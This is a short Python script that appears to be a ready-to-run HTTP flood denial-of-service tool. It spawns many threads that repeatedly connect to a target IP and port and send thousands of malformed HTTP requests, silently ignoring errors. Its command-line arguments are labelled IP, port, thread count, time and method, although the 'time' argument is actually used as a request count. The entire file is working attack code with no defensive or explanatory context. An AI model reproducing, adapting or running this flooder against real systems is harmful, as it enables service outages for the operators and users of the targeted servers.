import socket,threading,sys,random,string

def http_flood(ip,port,method,count):
    for _ in range(count):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip,port))
            packet = f'{method} /{"".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(1))} HTTP/1.1\nHost: {ip}\n\n\r\r'.encode()
            [s.send(packet) for _ in range(2500)]
        except:
            pass

ip = sys.argv[1]
port = int(sys.argv[2])
[threading.Thread(target=http_flood,args=(ip,port,sys.argv[5],int(sys.argv[4]))).start() for _ in range(int(sys.argv[3])*5)] # <IP> <PORT> <THREAD> <TIME> <METHOD_HTTP>